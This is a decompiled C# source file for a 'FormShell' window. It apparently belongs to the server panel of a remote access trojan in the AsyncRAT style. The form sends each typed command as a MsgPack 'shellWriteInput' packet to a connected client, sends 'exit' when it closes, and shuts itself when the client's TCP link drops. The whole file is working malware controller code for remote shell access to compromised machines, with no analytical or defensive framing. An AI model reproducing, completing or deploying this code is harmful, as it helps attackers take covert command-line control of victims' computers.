using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Siticone.Desktop.UI.WinForms;

namespace Server.Forms
{
	// Token: 0x020000A9 RID: 169
	public partial class FormShell : Form
	{
		// Token: 0x170000CB RID: 203
		// (get) Token: 0x06000549 RID: 1353 RVA: 0x00004CCD File Offset: 0x00002ECD
		// (set) Token: 0x0600054A RID: 1354 RVA: 0x00004CD5 File Offset: 0x00002ED5
		public FormMain F { get; set; }

		// Token: 0x170000CC RID: 204
		// (get) Token: 0x0600054B RID: 1355 RVA: 0x00004CDE File Offset: 0x00002EDE
		// (set) Token: 0x0600054C RID: 1356 RVA: 0x00004CE6 File Offset: 0x00002EE6
		internal Clients Client { get; set; }

		// Token: 0x0600054D RID: 1357 RVA: 0x00004CEF File Offset: 0x00002EEF
		public FormShell()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600054E RID: 1358 RVA: 0x00046584 File Offset: 0x00044784
		private void TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
			{
				if (this.textBox1.Text == "cls".ToLower())
				{
					this.richTextBox1.Clear();
					this.textBox1.Clear();
				}
				if (this.textBox1.Text == "exit".ToLower())
				{
					base.Close();
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
				msgPack.ForcePathObject("WriteInput").AsString = this.textBox1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.textBox1.Clear();
			}
		}

		// Token: 0x0600054F RID: 1359 RVA: 0x00046670 File Offset: 0x00044870
		private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
				msgPack.ForcePathObject("WriteInput").AsString = "exit";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000550 RID: 1360 RVA: 0x000466E0 File Offset: 0x000448E0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}
	}
}
